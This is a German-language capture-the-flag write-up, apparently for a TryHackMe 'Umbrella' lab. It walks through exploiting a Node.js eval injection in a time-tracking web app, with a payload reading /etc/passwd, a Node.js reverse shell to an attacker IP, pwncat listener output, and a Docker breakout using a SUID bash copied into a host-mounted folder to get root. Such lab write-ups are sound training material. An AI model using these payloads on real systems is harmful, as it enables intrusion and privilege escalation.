Da der Docker Dienst als Root-User läuft ist es mein Ziel erstmal in die Webapp rein zu kommen.


![Bild](/assets/Bilder/THM_umbrella/Pasted%20image%2020240202153512.png){: width="700" height="400" }

Anmeldung hat mit den selben Zugangsdaten funktioniert wie für SSH


![Bild](/assets/Bilder/THM_umbrella/Pasted%20image%2020240202153551.png){: width="700" height="400" }

Versuchen wir mal eine Wert zu Submitten

so wie es aussieht kann ich "Inter-Werte" übermitteln, aber sobald ich einen char etc. versuche erhalte ich folgende Fehlermeldung


![Bild](/assets/Bilder/THM_umbrella/Pasted%20image%2020240202153807.png){: width="700" height="400" }


![Bild](/assets/Bilder/THM_umbrella/Pasted%20image%2020240202153825.png){: width="700" height="400" }

Da haben wir unsere Schwachstelle "eval".

https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet

Versuchen wir mehr herauszubekommen bzw. gleich zu exploiten

nach einigen Versuchen habe ich folgenden Treffer erhalten

```
arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
```


![Bild](/assets/Bilder/THM_umbrella/Pasted%20image%2020240202154423.png){: width="700" height="400" }

Versuchen wir auch einen RCE zu bekommen

Leider hat keiner der Payloads funktioniert, nach einen kleinen google suche, habe ich folgenden Eintrag gefunden

https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73

versuchen wir folgenden Payload

```
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(9001, "10.8.126.227", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client);sh.stderr.pipe(client); }); return /a/;})();
```


Ich erhalte eine shell und bin root im docker-container

```
┌──(bumble㉿bumble)-[~/Downloads]
└─$ pwncat-cs -lp 9001                                     
/home/bumble/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  'class': algorithms.Blowfish,
[15:51:05] Welcome to pwncat !                                                                                                                                                                                             __main__.py:164
[15:52:21] received connection from 10.10.221.197:41836                                                                                                                                                                           bind.py:84
[15:52:22] 0.0.0.0:9001: upgrading from /bin/dash to /bin/bash                                                                                                                                                                manager.py:957
[15:52:23] 10.10.221.197:41836: registered new host w/ db                                                                                                                                                                     manager.py:957
(local) pwncat$ back
(remote) root@de0610f51845:/usr/src/app# whoami
root

```

ok das ziel ist klar 

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells-and-host-mount

```
Privilege Escalation with 2 shells and host mount[](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells-and-host-mount)

If you have access as **root inside a container** that has some folder from the host mounted and you have **escaped as a non privileged user to the host** and have read access over the mounted folder. You can create a **bash suid file** in the **mounted folder** inside the **container** and **execute it from the host** to privesc.

cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```

Versuchen wir es mal

```
claire-r@ctf:~/timeTracker-src/logs$ cp /bin/bash .
claire-r@ctf:~/timeTracker-src/logs$ ls -al
total 1168
drwxrw-rw- 2 claire-r claire-r    4096 Feb  2 14:56 .
drwxrwxr-x 6 claire-r claire-r    4096 Dec 22  2022 ..
-rwxr-xr-x 1 claire-r claire-r 1183448 Feb  2 14:56 bash
-rw-r--r-- 1 root     root         161 Feb  2 14:52 tt.log
```

jetzt im docker-Container schauen wie die Berechtigungen sind, id 1001 ist die von Claire

```
(remote) root@de0610f51845:/logs# ls -al
total 1168
drwxrw-rw- 2 1001 1001    4096 Feb  2 14:56 .
drwxr-xr-x 1 root root    4096 Dec 22  2022 ..
-rwxr-xr-x 1 1001 1001 1183448 Feb  2 14:56 bash
-rw-r--r-- 1 root root     161 Feb  2 14:52 tt.log

```

Berechtigungen jetzt im Docker-Container neu setzen

```
(remote) root@de0610f51845:/logs# chown root:root bash
(remote) root@de0610f51845:/logs# ls -al
total 1168
drwxrw-rw- 2 1001 1001    4096 Feb  2 14:56 .
drwxr-xr-x 1 root root    4096 Dec 22  2022 ..
-rwxr-xr-x 1 root root 1183448 Feb  2 14:56 bash
-rw-r--r-- 1 root root     161 Feb  2 14:52 tt.log
(remote) root@de0610f51845:/logs# chmod 4777 bash 
(remote) root@de0610f51845:/logs# 
```

ok jetzt noch ausführen

```
claire-r@ctf:~/timeTracker-src/logs$ ./bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
root.txt  snap
bash-5.0# cat root.txt


```